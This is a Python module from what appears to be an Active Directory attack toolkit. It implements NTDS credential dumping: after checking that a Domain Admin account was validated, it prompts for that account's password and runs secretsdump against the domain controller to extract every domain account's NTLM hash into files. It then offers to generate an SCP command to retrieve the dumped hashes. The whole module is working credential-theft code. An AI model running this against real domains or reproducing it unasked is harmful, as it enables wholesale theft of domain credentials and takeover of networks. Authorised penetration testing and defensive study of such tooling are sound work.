"""
NTDS dumping functionality.
"""

import subprocess
import typer

from rich.table import Table

from ad_kit.core.console import (
    console,
    print_error,
    print_info,
    print_section,
    print_success,
)
from ad_kit.core.util import (
    load_session,
    save_session, 
    get_artefacts_dir, 
    generate_scp_command
)


def print_summary(
    session_data: dict,
) -> None:
    """
    Print dump summary.
    """

    print_section("Summary")

    table = Table(show_header=False)

    table.add_column("Item", style="cyan")
    table.add_column("Value", style="green")

    table.add_row("Domain", session_data["domain"])
    table.add_row("DA User", session_data["domain_admin"])
    table.add_row(
        "NTDS Dump",
        ("Completed" if session_data["ntds_dumped"] else "Failed"),
    )

    console.print(table)


def run_dump() -> None:
    """
    Dump NTDS hashes using secretsdump.
    """

    try:
        session_data = load_session()

        if not session_data.get("da_validated"):
            raise RuntimeError("Domain Admin account has not been validated.")

        print_section("NTDS Dump")

        domain = session_data["domain"]
        dc_ip = session_data["dc_ip"]
        da_user = session_data["domain_admin"]

        print_info(f"Domain: {domain}")
        print_info(f"Domain Controller: {dc_ip}")
        print_info(f"Domain Admin: {da_user}")
        print("")

        da_pass = typer.prompt("Domain Admin Password", hide_input=True)

        output_dir = get_artefacts_dir()

        print_info("Running secretsdump...")

        result = subprocess.run(
            [
                "secretsdump.py",
                (
                    f"{domain}/"
                    f"{da_user}:"
                    f"{da_pass}@"
                    f"{dc_ip}"
                ),
                "-user-status",
                "-just-dc-ntlm",
                "-outputfile",
                domain,
            ],
            cwd=output_dir,
            capture_output=True,
            text=True,
        )

        if result.returncode != 0:
            print_error("NTDS dump failed.")

            if result.stderr:
                print_error(result.stderr.strip())
            elif result.stdout:
                print_error(result.stdout.strip())

            return

        session_data["ntds_dumped"] = True
        save_session(session_data)

        print_success("NTDS dump completed.")
        print_info(f"Output directory: {output_dir.resolve()}")
        print_summary(session_data)

        #-----------------------------------------------------------------------
        # Create SCP command
        #-----------------------------------------------------------------------
        if typer.confirm("Generate SCP retrieval command?", default=True):
            generate_scp_command(session_data)

    except Exception as exc:
        print_error(str(exc))